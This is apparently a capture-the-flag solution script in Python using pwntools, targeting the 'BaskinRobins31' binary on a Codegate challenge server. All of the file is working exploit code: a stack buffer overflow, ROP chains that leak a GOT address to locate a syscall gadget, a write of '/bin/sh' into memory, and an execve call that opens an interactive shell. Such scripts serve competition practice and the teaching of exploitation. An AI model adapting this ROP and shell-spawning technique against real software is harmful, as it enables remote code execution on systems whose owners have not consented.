#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


context(arch="i386", os="linux", endian="little")

class Pwn:
    def __init__(self):
        self.e = ELF("./BaskinRobins31")
        self.offset = 184
        self.p = None

    def start_binary(self):
        self.p = remote("ch41l3ng3s.codegate.kr", 3131)
        self.p.recvuntil("(1-3)\n")

    def read_addr(self, addr, data):
        rop = ROP([self.e])
        main = self.e.symbols['main']
        read_plt = self.e.plt['read']
        pop_rdi_rsi_rdx = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]

        rop.raw("A" * self.offset)
        rop.raw(p64(pop_rdi_rsi_rdx))
        rop.raw(p64(0x0))
        rop.raw(p64(addr))
        rop.raw(p64(len(data)))
        rop.raw(p64(read_plt))
        rop.raw(p64(main))

        self.p.sendline(str(rop))
        self.p.recvuntil("rules...:( \n")
        self.p.send(data)
        print "[x] Write " + str(len(data)) + " bytes at " + hex(addr) + " : " + data
        self.p.recvuntil("(1-3)\n")

    def write_addr(self, addr, size):
        rop = ROP([self.e])
        main = self.e.symbols['main']
        write_plt = self.e.plt['write']
        pop_rdi_rsi_rdx = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]

        rop.raw("A" * self.offset)
        rop.raw(p64(pop_rdi_rsi_rdx))
        rop.raw(p64(0x1))
        rop.raw(p64(addr))
        rop.raw(p64(size))
        rop.raw(p64(write_plt))
        rop.raw(p64(main))

        self.p.sendline(str(rop))
        self.p.recvuntil("rules...:( \n")
        data = self.p.recvline()
        data = data[:6]
        print "[x] Leak " + str(len(data)) + " bytes at " + hex(addr) + " : " + ":".join("{:02x}".format(ord(c)) for c in data)
        self.p.recvuntil("(1-3)\n")
        return u64(data+"\x00"*2)

    def execute_syscall(self, syscall_addr):
        rop = ROP([self.e])
        pop_rdi_rsi_rdx = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
        data_addr = self.e.get_section_by_name(".data").header.sh_addr
        read_plt = self.e.plt['read']

        rop.raw("A" * self.offset)
        rop.raw(p64(pop_rdi_rsi_rdx))
        rop.raw(p64(0x0))
        rop.raw(p64(data_addr+0x10))
        rop.raw(p64(0x3b))
        rop.raw(p64(read_plt))
        rop.raw(p64(pop_rdi_rsi_rdx))
        rop.raw(p64(data_addr))
        rop.raw(p64(0x0))
        rop.raw(p64(0x0))
        rop.raw(p64(syscall_addr))

        self.p.send(str(rop))
        self.p.recvuntil("rules...:( \n")
        self.p.send("A"*0x3b)
        self.p.interactive()
        self.p.close()

    def pwn_binary(self):
        self.start_binary()

        syscall_addr = self.write_addr(self.e.got['read'], 0x8) + 0xe
        print "[*] Find syscall gadget at:" + hex(syscall_addr)
        self.read_addr(self.e.get_section_by_name(".data").header.sh_addr, "/bin/sh\x00")
        print "[*] Write string \"/bin/sh\x00\" at:" + hex(self.e.get_section_by_name(".data").header.sh_addr)
        self.execute_syscall(syscall_addr)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
